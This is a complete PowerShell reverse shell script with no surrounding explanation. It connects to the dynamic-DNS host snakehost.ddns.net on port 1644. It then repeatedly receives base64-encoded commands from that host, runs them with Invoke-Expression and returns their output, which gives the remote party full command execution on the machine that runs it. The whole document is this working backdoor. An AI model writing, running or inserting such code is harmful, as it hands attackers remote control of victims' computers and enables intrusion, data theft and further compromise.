$socket = New-Object System.Net.Sockets.TCPClient("snakehost.ddns.net", 1644)
$stream = $socket.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$encoding = New-Object System.Text.AsciiEncoding


FUNCTION Encode-Command {
    param([string]$command)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    return $encodedCommand
}

FUNCTION Decode-Command {
    param([string]$encodedCommand)
    $bytes = [System.Convert]::FromBase64String($encodedCommand)
    $command = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $command
}


$writer.WriteLine("Connected")
$writer.Flush()


while ($true) {
    $line = $reader.ReadLine()
    $line = Decode-Command -encodedCommand $line 
    $cmd = Invoke-Expression -Command $line 2>&1
    $output = $cmd | Out-String
    $writer.WriteLine($output)
    $writer.Flush()
}

$reader.Close()
$writer.Close()
$socket.Close()